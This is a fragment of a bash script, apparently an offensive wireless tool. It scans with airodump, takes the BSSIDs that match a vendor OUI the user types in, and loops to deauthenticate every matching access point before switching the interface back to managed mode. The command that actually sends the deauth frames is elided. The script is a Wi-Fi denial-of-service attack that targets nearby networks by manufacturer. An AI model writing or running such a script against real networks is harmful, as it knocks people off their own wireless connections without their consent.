...
deauth_bssids() {
    local target_oui=$1
    local interface=$2
    echo "Deauthenticating BSSIDs with OUI: $target_oui"
    grep -i "$target_oui" sorted_ssids.csv | cut -d ',' -f 1 | while read -r bssid; do
        echo "Deauthenticating BSSID $bssid..."
...
airodump
get_Data
read -p "Enter the OUI to target for deauthentication: " target_oui
deauth_bssids $target_oui $interface
check_mode_if_monitor_set_managed
